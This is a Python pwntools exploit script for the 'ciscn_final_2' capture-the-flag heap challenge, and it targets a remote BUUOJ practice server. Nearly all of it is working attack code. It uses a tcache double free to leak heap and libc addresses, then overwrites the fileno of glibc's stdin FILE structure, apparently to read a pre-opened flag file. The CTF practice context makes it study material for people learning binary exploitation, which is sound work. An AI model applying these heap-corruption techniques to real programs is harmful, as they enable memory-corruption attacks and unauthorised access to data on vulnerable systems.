from pwn import *

elf = ELF('./ciscn_final_2')
# io = process(['glibc_run', '2.27', './ciscn_final_2'])
io = remote("node5.buuoj.cn", 27552)

def get_process_pid(name):
    pid_list = []
    processes = os.popen('ps -ef | grep %s' % name)
    process_info = processes.read()
    for i in process_info.split('\n')[:-1]:
        j = re.split(' +', i)
        if j[7] == name:
            pid_list.append(int(j[1]))
    return pid_list[0]

def add(kind, value):
	io.sendlineafter(b'which command?\n> ', b'1')
	io.sendlineafter(b'TYPE:\n1: int\n2: short int\n>', str(kind).encode())
	io.sendlineafter(b'your inode number:', str(value).encode())
	
def delete(kind):
	io.sendlineafter(b'which command?\n> ', b'2')
	io.sendlineafter(b'TYPE:\n1: int\n2: short int\n>', str(kind).encode())
	
def show(kind):
	io.sendlineafter(b'which command?\n> ', b'3')
	io.sendlineafter(b'TYPE:\n1: int\n2: short int\n>', str(kind).encode())
	
def quit(content):
	io.sendlineafter(b'which command?\n> ', b'4')
	io.sendlineafter(b'what do you want to say at last? ', content)
	
add(1, 0x12345678)
delete(1)
add(2, 0x1234)
add(2, 0x1234)
add(2, 0x1234)
add(2, 0x1234)
add(2, 0x1234)
delete(2)
add(1, 0x12345678)
delete(2)
show(2)
io.recvuntil(b'your short type inode number :')
heap_lsw = int(io.recvuntil(b'\n', drop=True).decode(), 10)
if heap_lsw < 0:
	heap_lsw += 65536
print(hex(heap_lsw))

add(2, heap_lsw - 0xC0)
delete(1)
add(2, 0x1234)
add(2, 0xB1)
delete(1)
for i in range(7):
	add(2, 0x1234)
	delete(1)

show(1)
io.recvuntil(b'your int type inode number :')
libc_base_lsdw = int(io.recvuntil(b'\n', drop=True).decode(), 10)
if libc_base_lsdw < 0:
	libc_base_lsdw += 0x1_0000_0000
libc_base_lsdw -= 0x3ebca0
__free_hook = libc_base_lsdw + 0x3ed8e8
_IO_2_1_stdin_ = libc_base_lsdw + 0x3eba00
print(hex(libc_base_lsdw))

add(2, (_IO_2_1_stdin_ & 0xFFFF) + 112)
add(1, 0x12345678)
add(1, 666)

quit(b'')

# gdb.attach(get_process_pid("./ciscn_final_2"))
io.interactive()
